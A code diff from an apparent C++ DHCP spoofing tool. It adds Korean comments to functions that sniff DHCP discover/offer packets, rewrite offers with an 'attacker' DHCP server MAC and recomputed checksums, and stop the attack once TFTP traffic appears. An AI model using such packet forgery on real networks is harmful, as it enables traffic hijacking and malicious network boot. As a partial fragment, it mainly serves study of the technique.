@@ -1,6 +1,6 @@
 #include "detect_packet.h"
 
-bool detect_parsing_packet(parse *ps)//void -> bool
+bool detect_parsing_packet(parse *ps)//void -> bool //discover 패킷과 offer패킷 탐지와 
 {
     pcap_t *pcd;
     const u_char *packet;
@@ -12,7 +12,7 @@ bool detect_parsing_packet(parse *ps)//void -> bool
     while(true)
     {
         res=pcap_next_ex(pcd, &pkthdr, &packet);
-        if(pkthdr->len<=0 || (check==1 && check2==1))
+        if(pkthdr->len<=0 || (check==1 && check2==1))  //check 값이 둘 다 1일때 함수 종료
             return true;// break -> return true
         switch (res)
         {
@@ -102,13 +102,13 @@ bool detect_parsing_packet(parse *ps)//void -> bool
                             }
                         }
                         cal_checksum cc;
-                        cout << ">> Data modify Complete" << endl;
+                        cout << ">> Data modify Complete" << endl; //데이터 변조 끝
                         ps->make_dhcp_arr_space(MTU);
                         ps->get_dhcp_data_length(ntohs(up->len)-sizeof(struct udphdr));
                         ps->get_dhcp_data((uint8_t*)packet);
                         ps->make_dhcp_length(sizeof(struct ether_header)+ntohs(ip->tot_len));
 
-                        cout << ">> DHCP Offer data is parsed" << endl;
+                        cout << ">> DHCP Offer data is parsed" << endl; //offer패킷에서 필요한 부분 파씽완료
 
                         memcpy(ep->ether_shost,ps->using_attacker_dhcp_server_mac(),6);
                         ps->make_dhcp_packet((uint8_t*)ep,sizeof(struct ether_header),false);
@@ -127,11 +127,12 @@ bool detect_parsing_packet(parse *ps)//void -> bool
                         cc.get_udphdr(up);
                         cc.get_pesudo(udpchecksum);
                         up->check=htons(cc.checksum(udpchecksum));
-                        ps->make_dhcp_packet((uint8_t*)up,sizeof(struct udphdr),true);
-                        ps->pre_packet_length+=sizeof(struct udphdr);
-                        ps->make_dhcp_packet((uint8_t*)bs,ps->using_dhcp_data_length(),true);
+                        ps->make_dhcp_packet((uint8_t*)up,sizeof(struct udphdr),true);//udp 데이터 패킷 생성
+                        ps->pre_packet_length+=sizeof(struct udphdr);//udp 패킷뒤에 bootstrap이 붙음으로 길이 측정해놓음
+                        ps->make_dhcp_packet((uint8_t*)bs,ps->using_dhcp_data_length(),true);//bootstrap 데이터 패킷 생성 
                         //ps->show_dhcp_packet();
                         check2=1;
+                        //패킷 데이터를 공격자의 데이터로 변조
                     }
                 }
             }
@@ -154,7 +155,7 @@ bool detect_parsing_packet(parse *ps)//void -> bool
         }
     }
 }
-void detect_tftp_packet(parse *ps, atomic<bool> &run)
+void detect_tftp_packet(parse *ps, atomic<bool> &run) //tftp 발생시 공격 중지
 {
     char errbuf[PCAP_ERRBUF_SIZE];
     const u_char *packet;
